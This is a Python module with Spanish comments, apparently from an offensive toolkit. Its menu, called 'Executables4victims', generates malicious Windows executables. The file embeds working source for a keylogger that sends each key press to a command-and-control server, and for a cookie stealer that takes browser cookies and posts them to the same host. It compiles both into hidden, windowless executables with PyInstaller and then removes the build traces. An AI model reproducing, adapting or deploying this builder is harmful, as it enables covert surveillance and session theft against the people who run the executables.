import os
import subprocess
import threading
import requests
from utils.colors import Colors

# Carpeta de salida para los ejecutables
OUTPUT_EXE_DIR = os.path.join(os.path.dirname(__file__), "..", "OUTPUT_EXE")

# URL del servidor de Comando y Control (C&C)
C2_SERVER_URL = "http://your-cnc-server.com/api/data"

def send_to_c2(data, executable_name):
    """
    Envía los datos al servidor de Comando y Control (C&C).
    """
    try:
        payload = {
            "executable_name": executable_name,
            "data": data
        }
        requests.post(C2_SERVER_URL, json=payload)
    except Exception as e:
        print(f"{Colors.FAIL}Error al enviar datos al C&C: {e}{Colors.ENDC}")

def generate_keylogger(executable_name):
    """
    Genera un keylogger y lo guarda como un ejecutable.
    """
    keylogger_code = f"""
import os
import keyboard
import requests
import threading

C2_SERVER_URL = "{C2_SERVER_URL}"

def send_to_c2(data):
    try:
        payload = {{
            "executable_name": "{executable_name}",
            "data": data
        }}
        requests.post(C2_SERVER_URL, json=payload)
    except:
        pass

def on_key_event(event):
    send_to_c2(event.name)

keyboard.on_press(on_key_event)
keyboard.wait()
"""

    # Guardar el código en un archivo temporal
    keylogger_file = os.path.join(OUTPUT_EXE_DIR, f"{executable_name}.py")
    with open(keylogger_file, "w") as f:
        f.write(keylogger_code)

    # Compilar el archivo a un ejecutable
    subprocess.run([
        "pyinstaller", "--onefile", "--noconsole",
        f"--distpath={OUTPUT_EXE_DIR}", f"--workpath={OUTPUT_EXE_DIR}/build",
        f"--specpath={OUTPUT_EXE_DIR}", f"--name={executable_name}", keylogger_file
    ])

    # Eliminar archivos innecesarios
    os.remove(os.path.join(OUTPUT_EXE_DIR, f"{executable_name}.py"))
    os.remove(os.path.join(OUTPUT_EXE_DIR, f"{executable_name}.spec"))
    os.rmdir(os.path.join(OUTPUT_EXE_DIR, "build"))

    print(f"{Colors.OKGREEN}Keylogger generado: {executable_name}.exe{Colors.ENDC}")

def generate_cookie_stealer(executable_name):
    """
    Genera un extractor de cookies y lo guarda como un ejecutable.
    """
    cookie_stealer_code = f"""
import os
import requests
import browser_cookie3

C2_SERVER_URL = "{C2_SERVER_URL}"

def send_to_c2(data):
    try:
        payload = {{
            "executable_name": "{executable_name}",
            "data": data
        }}
        requests.post(C2_SERVER_URL, json=payload)
    except:
        pass

cookies = browser_cookie3.load()
send_to_c2(str(cookies))
"""

    # Guardar el código en un archivo temporal
    cookie_stealer_file = os.path.join(OUTPUT_EXE_DIR, f"{executable_name}.py")
    with open(cookie_stealer_file, "w") as f:
        f.write(cookie_stealer_code)

    # Compilar el archivo a un ejecutable
    subprocess.run([
        "pyinstaller", "--onefile", "--noconsole",
        f"--distpath={OUTPUT_EXE_DIR}", f"--workpath={OUTPUT_EXE_DIR}/build",
        f"--specpath={OUTPUT_EXE_DIR}", f"--name={executable_name}", cookie_stealer_file
    ])

    # Eliminar archivos innecesarios
    os.remove(os.path.join(OUTPUT_EXE_DIR, f"{executable_name}.py"))
    os.remove(os.path.join(OUTPUT_EXE_DIR, f"{executable_name}.spec"))
    os.rmdir(os.path.join(OUTPUT_EXE_DIR, "build"))

    print(f"{Colors.OKGREEN}Extractor de cookies generado: {executable_name}.exe{Colors.ENDC}")

def executables4victims():
    """
    Menú para generar ejecutables maliciosos.
    """
    print(f"{Colors.BOLD}{Colors.OKBLUE}Executables4victims{Colors.ENDC}")
    print(f"{Colors.OKGREEN}1. Generar Keylogger{Colors.ENDC}")
    print(f"{Colors.OKGREEN}2. Generar Extractor de Cookies{Colors.ENDC}")
    choice = input(f"{Colors.BOLD}{Colors.WARNING}Selecciona una opción: {Colors.ENDC}")

    if choice == '1':
        executable_name = input(f"{Colors.BOLD}{Colors.WARNING}Introduce el nombre del keylogger (ej. keylogger_1): {Colors.ENDC}")
        generate_keylogger(executable_name)
    elif choice == '2':
        executable_name = input(f"{Colors.BOLD}{Colors.WARNING}Introduce el nombre del extractor de cookies (ej. cookie_stealer_1): {Colors.ENDC}")
        generate_cookie_stealer(executable_name)
    else:
        print(f"{Colors.FAIL}Opción no válida.{Colors.ENDC}")